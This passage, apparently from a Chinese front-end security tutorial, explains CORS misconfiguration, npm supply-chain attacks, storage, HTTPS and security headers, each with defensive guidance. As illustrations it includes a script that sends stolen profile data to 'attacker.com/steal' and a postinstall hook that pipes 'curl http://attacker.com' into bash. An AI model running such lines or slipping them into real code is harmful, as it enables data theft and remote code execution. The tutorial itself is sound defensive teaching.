<p>即使页面被嵌入 iframe，设置了 <code>SameSite=Strict</code> 或 <code>SameSite=Lax</code> 的 Cookie 不会发送，用户在 iframe 里相当于未登录状态，无法完成敏感操作。</p>
<p><strong>4. 前端检测</strong></p>
<p>JavaScript 检测页面是否被嵌入：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">top</span> !== <span class="hljs-variable language_">window</span>.<span class="hljs-property">self</span>) {
  <span class="hljs-comment">// 页面被嵌入 iframe</span>
  <span class="hljs-comment">// 可以跳出 iframe 或显示警告</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">top</span>.<span class="hljs-property">location</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">self</span>.<span class="hljs-property">location</span>;
}
</code></pre>
<p>但这个方法不太可靠，攻击者可以用 <code>sandbox</code> 属性禁用脚本。建议作为辅助手段，主要还是靠 HTTP 头。</p>
<p>这三个手段建议同时使用，形成纵深防御。</p>
<hr/>
<h2 data-id="heading-9">CORS 配置错误：开错了门</h2>
<p>CORS（跨域资源共享）本身是安全机制，但配置不当反而会造成漏洞。</p>
<h3 data-id="heading-10">危险配置示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端代码 - 危险示例</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// 把请求的 Origin 直接反射回去，太危险了</span>
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>);
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p>这样配置等于对所有网站敞开大门。攻击者网站可以发请求获取用户数据：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 攻击者网站 (evil.com)</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.target.com/user/profile'</span>, {
  <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>  <span class="hljs-comment">// 带上 cookie</span>
})
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
  <span class="hljs-comment">// 拿到用户敏感信息，发送给攻击者服务器</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://attacker.com/steal'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)
  });
});
</code></pre>
<p>因为响应头允许任意 Origin 并且允许携带凭证，攻击者可以轻松窃取用户数据。</p>
<h3 data-id="heading-11">安全配置</h3>
<p><strong>1. 白名单验证</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allowedOrigins = [
  <span class="hljs-string">'https://myapp.com'</span>,
  <span class="hljs-string">'https://admin.myapp.com'</span>,
  <span class="hljs-string">'https://mobile.myapp.com'</span>
];

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>;
  <span class="hljs-keyword">if</span> (allowedOrigins.<span class="hljs-title function_">includes</span>(origin)) {
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, origin);
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  }
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p><strong>2. 正则匹配（谨慎使用）</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allowedOriginPattern = <span class="hljs-regexp">/^https:\/\/.*\.myapp\.com$/</span>;

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>;
  <span class="hljs-keyword">if</span> (origin &amp;&amp; allowedOriginPattern.<span class="hljs-title function_">test</span>(origin)) {
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, origin);
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  }
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p>注意正则要严格，避免被绕过。比如 <code>/\.myapp\.com$/</code> 可以被 <code>evil.com.myapp.com</code> 绕过。</p>
<p><strong>3. 限制允许的方法和头</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Methods'</span>, <span class="hljs-string">'GET, POST, PUT, DELETE'</span>);
res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Headers'</span>, <span class="hljs-string">'Content-Type, Authorization'</span>);
res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Max-Age'</span>, <span class="hljs-string">'86400'</span>);  <span class="hljs-comment">// 预检请求缓存 24 小时</span>
</code></pre>
<p><strong>CORS 安全原则</strong>：</p>
<ul>
<li>不要用通配符 <code>*</code>（而且 <code>*</code> 和 <code>credentials: true</code> 不能同时用）</li>
<li>不要动态反射 Origin 而不验证</li>
<li>白名单要精确到协议+域名+端口</li>
<li>限制允许的 HTTP 方法</li>
<li>敏感接口不要开启 CORS，或者严格限制 Origin</li>
</ul>
<hr/>
<h2 data-id="heading-12">依赖安全：供应链攻击</h2>
<p>npm 生态有个问题：安装一个包会引入 79 个第三方依赖和 39 个维护者的隐式信任。如果某个依赖被攻击者控制，你的项目就危险了。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph 你的项目
        A[package.json]
    end

    subgraph 直接依赖
        B[lodash]
        C[axios]
    end

    subgraph 间接依赖
        D[follow-redirects]
        E[form-data]
        F[...]
    end

    A --&gt; B
    A --&gt; C
    C --&gt; D
    C --&gt; E
    D --&gt; F

    style F fill:#ff6b6b,color:#fff
    G[攻击者控制的包] -.-&gt;|替换/入侵| F
</code></pre>
<h3 data-id="heading-13">真实案例</h3>
<p><strong>2024 年 chalk 攻击事件</strong></p>
<p>攻击者通过钓鱼邮件入侵了知名包 <code>chalk</code> 的维护者账号，篡改了代码。<code>chalk</code> 每周下载量超 2 亿次，影响面巨大。恶意代码会在浏览器端执行，劫持加密货币钱包交易。虽然 2.5 小时后就被发现并撤回，但已经有不少项目中招。</p>
<p>同时被攻击的还有 <code>debug</code>、<code>ansi-styles</code> 等 18 个热门包，总下载量超 20 亿次/周。</p>
<h3 data-id="heading-14">常见攻击手法</h3>
<p><strong>1. 依赖混淆</strong></p>
<p>公司内部用私有 npm 源，包名叫 <code>@company/utils</code>。攻击者在公共 npm 上注册同名包，如果配置不当，npm 可能优先安装公共源的恶意包。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 攻击者注册公共包</span>
npm publish @company/utils

<span class="hljs-comment"># 公司内部安装时，如果没正确配置，可能装到恶意包</span>
npm install @company/utils
</code></pre>
<p><strong>2. 恶意安装脚本</strong></p>
<p>npm 包可以在 <code>package.json</code> 里定义安装脚本：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"preinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node malicious.js"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"postinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"curl http://attacker.com | bash"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>一 <code>npm install</code>，脚本就执行了。可以窃取环境变量、源码、密钥等。</p>
<p><strong>3. Typosquatting（错别字攻击）</strong></p>
<p>注册与知名包相似的名字，等人打错字：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 正确的包</span>
npm install lodash

<span class="hljs-comment"># 攻击者注册的恶意包</span>
npm install loadash  <span class="hljs-comment"># 少个 d</span>
npm install lodahs   <span class="hljs-comment"># h 和 s 位置反了</span>
</code></pre>
<h3 data-id="heading-15">防御供应链攻击</h3>
<p><strong>1. 锁定依赖版本</strong></p>
<p>用 <code>package-lock.json</code> 或 <code>yarn.lock</code> 固定依赖版本，防止自动升级引入恶意代码：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json - 精确版本，不要用 ^ 或 ~</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"lodash"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"4.17.21"</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// 精确版本</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.6.2"</span>        <span class="hljs-comment">// 不用 ^1.6.2 或 ~1.6.2</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>并且提交 <code>package-lock.json</code> 到代码仓库。</p>
<p><strong>2. 使用 npm ci</strong></p>
<p>CI/CD 流程中用 <code>npm ci</code> 而不是 <code>npm install</code>，确保严格按照 lock 文件安装：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># CI 脚本</span>
npm ci              <span class="hljs-comment"># 严格按 lock 文件安装</span>
npm run build
npm <span class="hljs-built_in">test</span>
</code></pre>
<p><code>npm ci</code> 的特点：</p>
<ul>
<li>删除 <code>node_modules</code> 重新安装</li>
<li>严格按 lock 文件，不会修改它</li>
<li>如果 lock 文件和 package.json 不一致会报错</li>
</ul>
<p><strong>3. 定期审计依赖</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># npm 内置审计</span>
npm audit
npm audit fix       <span class="hljs-comment"># 自动修复</span>

<span class="hljs-comment"># 或者用第三方工具</span>
npx snyk <span class="hljs-built_in">test</span>       <span class="hljs-comment"># Snyk</span>
npx socket security <span class="hljs-comment"># Socket</span>
</code></pre>
<p>设置 CI 自动检查：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># GitHub Actions</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Security</span> <span class="hljs-string">audit</span>
  <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">audit</span> <span class="hljs-string">--audit-level=moderate</span>
</code></pre>
<p><strong>4. 禁用安装脚本</strong></p>
<p>如果不需要运行安装脚本，可以禁用：</p>
<pre><code class="hljs language-bash" lang="bash">npm install --ignore-scripts
</code></pre>
<p>在 <code>.npmrc</code> 里全局设置：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ignore-scripts</span>=<span class="hljs-literal">true</span>
</code></pre>
<p>需要运行脚本时手动执行：</p>
<pre><code class="hljs language-bash" lang="bash">npm rebuild
</code></pre>
<p><strong>5. 私有源 + 白名单</strong></p>
<p>公司内部搭建私有 npm 源（如 Verdaccio），只允许审核过的包进入。配合 <code>@scope</code> 命名空间使用：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// .npmrc</span>
@company<span class="hljs-punctuation">:</span>registry=https<span class="hljs-punctuation">:</span><span class="hljs-comment">//npm.company.com</span>
registry=https<span class="hljs-punctuation">:</span><span class="hljs-comment">//registry.npmjs.org</span>
</code></pre>
<p>这样 <code>@company/</code> 开头的包走私有源，其他包走公共源。</p>
<p><strong>6. 检查依赖完整性</strong></p>
<p>使用 Subresource Integrity（SRI）验证 CDN 资源：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>
  <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.example.com/library.js"</span>
  <span class="hljs-attr">integrity</span>=<span class="hljs-string">"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"</span>
  <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>
&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>如果 CDN 资源被篡改，浏览器会拒绝加载。</p>
<p><strong>7. 减少依赖数量</strong></p>
<p>少用依赖。一个 <code>left-pad</code> 这种功能自己写几行代码就能搞定，没必要引入外部包：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 不需要安装 left-pad</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">leftPad</span>(<span class="hljs-params">str, len, char = <span class="hljs-string">' '</span></span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>(char).<span class="hljs-title function_">repeat</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, len - <span class="hljs-title class_">String</span>(str).<span class="hljs-property">length</span>)) + str;
}
</code></pre>
<p>每多一个依赖就多一个风险点。定期检查 <code>node_modules</code>，移除不用的包。</p>
<p><strong>工具推荐</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flirantal%2Flockfile-lint" target="_blank" title="https://github.com/lirantal/lockfile-lint" ref="nofollow noopener noreferrer">lockfile-lint</a>：检测 lockfile 是否被篡改</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnaugtur%2Fnpm-audit-resolver" target="_blank" title="https://github.com/naugtur/npm-audit-resolver" ref="nofollow noopener noreferrer">npm-audit-resolver</a>：更好的漏洞修复工具</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsnyk.io%2F" target="_blank" title="https://snyk.io/" ref="nofollow noopener noreferrer">Snyk</a>：依赖安全扫描</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsocket.dev%2F" target="_blank" title="https://socket.dev/" ref="nofollow noopener noreferrer">Socket</a>：实时监控依赖变化</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdependabot" target="_blank" title="https://github.com/dependabot" ref="nofollow noopener noreferrer">Dependabot</a>：GitHub 自动更新依赖的安全补丁</li>
</ul>
<hr/>
<h2 data-id="heading-16">本地存储安全：不该放的别放</h2>
<p>localStorage 和 sessionStorage 很方便，但它们对 JavaScript 完全可见。只要页面有 XSS 漏洞，攻击者就能把里面的东西全偷走。</p>
<h3 data-id="heading-17">不要存这些</h3>
<ul>
<li><strong>JWT Token</strong>：最常见的错误，XSS 一发生就被偷走</li>
<li><strong>用户密码</strong>：即使加密也不要存在前端</li>
<li><strong>个人敏感信息</strong>：身份证号、银行卡号、手机号等</li>
<li><strong>API 密钥</strong>：应该在后端管理</li>
<li><strong>会话 ID</strong>：用 HttpOnly Cookie 更安全</li>
</ul>
<h3 data-id="heading-18">如果非要存</h3>
<ol>
<li><strong>评估风险</strong>：确认这个数据泄露后的影响</li>
<li><strong>加密存储</strong>：虽然不能阻止 XSS 攻击者拿到密文，但至少增加破解成本</li>
<li><strong>设置过期时间</strong>：自己实现过期机制，减少长期暴露的风险</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 封装带过期时间的存储</span>
<span class="hljs-keyword">const</span> secureStorage = {
  <span class="hljs-title function_">set</span>(<span class="hljs-params">key, value, ttl = <span class="hljs-number">3600000</span></span>) {  <span class="hljs-comment">// 默认 1 小时</span>
    <span class="hljs-keyword">const</span> item = {
      value,
      <span class="hljs-attr">expiry</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + ttl
    };
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(key, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(item));
  },

  <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) {
    <span class="hljs-keyword">const</span> itemStr = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(key);
    <span class="hljs-keyword">if</span> (!itemStr) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">const</span> item = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(itemStr);
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &gt; item.<span class="hljs-property">expiry</span>) {
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(key);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">return</span> item.<span class="hljs-property">value</span>;
  },

  <span class="hljs-title function_">remove</span>(<span class="hljs-params">key</span>) {
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(key);
  }
};

<span class="hljs-comment">// 使用</span>
secureStorage.<span class="hljs-title function_">set</span>(<span class="hljs-string">'tempData'</span>, { <span class="hljs-attr">foo</span>: <span class="hljs-string">'bar'</span> }, <span class="hljs-number">60000</span>);  <span class="hljs-comment">// 1 分钟过期</span>
<span class="hljs-keyword">const</span> data = secureStorage.<span class="hljs-title function_">get</span>(<span class="hljs-string">'tempData'</span>);
</code></pre>
<h3 data-id="heading-19">推荐方案</h3>
<p>认证 token 优先考虑 <strong>HttpOnly Cookie</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端设置</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'auth_token'</span>, token, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// JavaScript 访问不到</span>
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,        <span class="hljs-comment">// 只在 HTTPS 下发送</span>
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>,  <span class="hljs-comment">// 防 CSRF</span>
  <span class="hljs-attr">maxAge</span>: <span class="hljs-number">3600000</span>      <span class="hljs-comment">// 1 小时过期</span>
});

<span class="hljs-comment">// 前端发请求时，浏览器会自动带上 cookie</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/user/profile'</span>, {
  <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>
});
</code></pre>
<p>这样即使有 XSS 漏洞，攻击者也拿不到 token。</p>
<h3 data-id="heading-20">IndexedDB 和 Web SQL</h3>
<p>它们也有同样的问题，JavaScript 可以完全访问。不要用来存敏感数据。</p>
<hr/>
<h2 data-id="heading-21">HTTPS：传输安全的基础</h2>
<p>HTTP 是明文传输，中间人能看到和修改所有内容。HTTPS 用 TLS/SSL 加密，提供三个保障：</p>
<ol>
<li><strong>内容加密</strong>：中间人看不到传输内容</li>
<li><strong>身份认证</strong>：确保访问的是真正的服务器，不是中间人伪造的</li>
<li><strong>数据完整性</strong>：防止内容被篡改</li>
</ol>
<h3 data-id="heading-22">HTTPS 工作原理</h3>
<p>HTTPS 用的是混合加密：<strong>非对称加密 + 对称加密</strong>。</p>
<p><strong>为什么不全用非对称加密？</strong></p>
<ul>
<li>非对称加密安全但慢（RSA 加密速度比 AES 慢 1000 倍）</li>
<li>对称加密快但不安全（密钥怎么传输？）</li>
</ul>
<p>所以结合两者：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant 客户端
    participant 服务器

    rect rgb(200, 230, 255)
        Note over 客户端, 服务器: 握手阶段（非对称加密）
        客户端-&gt;&gt;服务器: 1. 请求HTTPS连接
        服务器-&gt;&gt;客户端: 2. 返回数字证书(含公钥)
        客户端-&gt;&gt;客户端: 3. 验证证书合法性
        客户端-&gt;&gt;服务器: 4. 生成对称密钥，用公钥加密发送
        服务器-&gt;&gt;服务器: 5. 用私钥解密，获取对称密钥
    end

    rect rgb(200, 255, 200)
        Note over 客户端, 服务器: 传输阶段（对称加密）
        客户端-&gt;&gt;服务器: 6. 用对称密钥加密数据
        服务器-&gt;&gt;客户端: 7. 用对称密钥加密响应
    end
</code></pre>
<ol>
<li>
<p><strong>握手阶段（非对称加密）</strong>：</p>
<ul>
<li>客户端请求 HTTPS 连接</li>
<li>服务器返回数字证书（包含公钥）</li>
<li>客户端验证证书合法性</li>
<li>客户端生成随机对称密钥，用服务器公钥加密后发送</li>
<li>服务器用私钥解密，拿到对称密钥</li>
</ul>
</li>
<li>
<p><strong>数据传输阶段（对称加密）</strong>：</p>
<ul>
<li>双方用协商好的对称密钥加密所有数据</li>
<li>速度快，安全性也有保障</li>
</ul>
</li>
</ol>
<h3 data-id="heading-23">数字证书如何防止中间人攻击</h3>
<p>中间人可能拦截服务器的公钥，替换成自己的。数字证书解决这个问题：</p>
<ol>
<li>
<p><strong>证书包含</strong>：</p>
<ul>
<li>服务器公钥</li>
<li>域名信息</li>
<li>证书颁发机构（CA）的数字签名</li>
</ul>
</li>
<li>
<p><strong>验证流程</strong>：</p>
<ul>
<li>浏览器用 CA 的公钥验证数字签名</li>
<li>CA 的公钥内置在操作系统/浏览器中</li>
<li>如果签名验证失败，说明证书被篡改</li>
</ul>
</li>
<li>
<p><strong>信任链</strong>：</p>
<ul>
<li>根 CA（受信任的权威机构）</li>
<li>中间 CA</li>
<li>服务器证书</li>
</ul>
</li>
</ol>
<p>中间人即使拦截并替换证书，也无法伪造 CA 的签名，浏览器会报警告。</p>
<h3 data-id="heading-24">前端要注意的</h3>
<p><strong>1. 强制 HTTPS</strong></p>
<p>配置重定向，HTTP 自动跳 HTTPS：</p>
<pre><code class="hljs language-nginx" lang="nginx">server {
  listen 80;
  server_name example.com;
  return 301 https://$server_name$request_uri;
}

server {
  listen 443 ssl http2;
  server_name example.com;

  ssl_certificate /path/to/cert.pem;
  ssl_certificate_key /path/to/key.pem;

  # 现代 SSL 配置
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers HIGH:!aNULL:!MD5;
  ssl_prefer_server_ciphers on;
}
</code></pre>
<p><strong>2. HSTS（HTTP Strict Transport Security）</strong></p>
<p>告诉浏览器以后只用 HTTPS 访问：</p>
<pre><code class="hljs language-ini" lang="ini">Strict-Transport-Security: <span class="hljs-attr">max-age</span>=<span class="hljs-number">31536000</span><span class="hljs-comment">; includeSubDomains; preload</span>
</code></pre>
<ul>
<li><code>max-age=31536000</code>：1 年内强制 HTTPS</li>
<li><code>includeSubDomains</code>：包括所有子域名</li>
<li><code>preload</code>：加入浏览器预加载列表（去 hstspreload.org 提交）</li>
</ul>
<p>设置 HSTS 后，即使用户输入 <code>http://example.com</code>，浏览器也会自动改成 <code>https://</code>。</p>
<p><strong>3. 避免混合内容（Mixed Content）</strong></p>
<p>HTTPS 页面里不要加载 HTTP 资源，否则浏览器会警告或阻止：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 危险 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://cdn.example.com/image.jpg"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 安全 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.example.com/image.jpg"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 协议相对路径（自动匹配当前页面协议） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"//example.com/script.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>检查混合内容：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 检测页面是否有混合内容</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'https'</span>));

<span class="hljs-comment">// 监听混合内容警告</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'securitypolicyviolation'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'Mixed content:'</span>, e);
});
</code></pre>
<p><strong>4. 证书有效期</strong></p>
<p>记得续期证书。可以用 Let's Encrypt 免费证书，配合 certbot 自动续期：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 certbot</span>
apt-get install certbot python3-certbot-nginx

<span class="hljs-comment"># 获取证书</span>
certbot --nginx -d example.com

<span class="hljs-comment"># 自动续期（cron job）</span>
0 0 * * * certbot renew --quiet
</code></pre>
<hr/>
<h2 data-id="heading-25">安全 HTTP 响应头清单</h2>
<p>除了前面提到的 CSP、X-Frame-Options、HSTS，还有几个重要的安全头：</p>
<h3 data-id="heading-26">1. X-Content-Type-Options</h3>
<p>禁止浏览器 MIME 类型嗅探：</p>
<pre><code class="hljs language-css" lang="css">X-<span class="hljs-attribute">Content</span>-Type-Options: nosniff
</code></pre>
<p>防止浏览器把 <code>text/plain</code> 文件当 JavaScript 执行。</p>
<h3 data-id="heading-27">2. Referrer-Policy</h3>
<p>控制 Referer 头泄露多少信息：</p>
<pre><code class="hljs language-sql" lang="sql">Referrer<span class="hljs-operator">-</span>Policy: strict<span class="hljs-operator">-</span>origin<span class="hljs-operator">-</span><span class="hljs-keyword">when</span><span class="hljs-operator">-</span><span class="hljs-keyword">cross</span><span class="hljs-operator">-</span>origin
</code></pre>
<p>可选值：</p>
<ul>
<li><code>no-referrer</code>：不发送</li>
<li><code>no-referrer-when-downgrade</code>：HTTPS→HTTP 不发送</li>
<li><code>origin</code>：只发送域名</li>
<li><code>strict-origin-when-cross-origin</code>：跨域只发送域名（推荐）</li>
</ul>
<h3 data-id="heading-28">3. Permissions-Policy</h3>
<p>限制浏览器功能（原 Feature-Policy）：</p>
<pre><code class="hljs language-ini" lang="ini">Permissions-Policy: <span class="hljs-attr">geolocation</span>=(), microphone=(), camera=(), payment=()
</code></pre>
<p>禁止页面访问摄像头、麦克风、地理位置等。</p>
<h3 data-id="heading-29">4. X-XSS-Protection（已过时）</h3>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">X-XSS-Protection: 0</span>
</code></pre>
<p>这个头已经过时了，现代浏览器不再推荐使用。用 CSP 代替。</p>
<h3 data-id="heading-30">完整配置示例</h3>
<pre><code class="hljs language-nginx" lang="nginx"># Nginx 配置
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'self'" always;
</code></pre>
<h3 data-id="heading-31">检测工具</h3>
<p>用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fsecurityheaders.com" target="_blank" title="https://securityheaders.com" ref="nofollow noopener noreferrer">securityheaders.com</a> 检测你的网站缺少哪些安全头，会给出评分和改进建议。</p>
<hr/>
<h2 data-id="heading-32">小结</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap
  root((前端安全))
    输入安全
      XSS防御
        转义输出
        textContent
        DOMPurify
        CSP
      验证过滤
    请求安全
      CSRF防御
        Token
        SameSite Cookie
      CORS配置
        白名单
        限制方法
    传输安全
      HTTPS
      HSTS
      证书管理
    存储安全
      HttpOnly Cookie
      避免localStorage存敏感数据
    依赖安全
      版本锁定
      npm audit
      私有源
</code></pre>
<p>前端安全的核心思路：</p>
<ol>
<li><strong>不信任任何输入</strong>：用户输入、URL 参数、第三方数据，都要验证和转义</li>
<li><strong>最小权限原则</strong>：Cookie 设置 HttpOnly、Secure、SameSite；CSP 限制资源加载；CORS 白名单</li>
<li><strong>纵深防御</strong>：不要依赖单一防护手段，多层防护叠加</li>
<li><strong>保持更新</strong>：依赖版本、安全补丁、浏览器新特性</li>
</ol>
<p>具体措施速查：</p>
<ul>
<li><strong>XSS 防御</strong>：用 <code>textContent</code>、转义 HTML、DOMPurify、HttpOnly Cookie、CSP</li>
<li><strong>CSRF 防御</strong>：CSRF Token、SameSite Cookie、验证请求来源</li>
<li><strong>点击劫持防御</strong>：X-Frame-Options、CSP frame-ancestors、SameSite Cookie</li>
<li><strong>CORS 安全</strong>：白名单验证 Origin，不动态反射，限制方法和头</li>
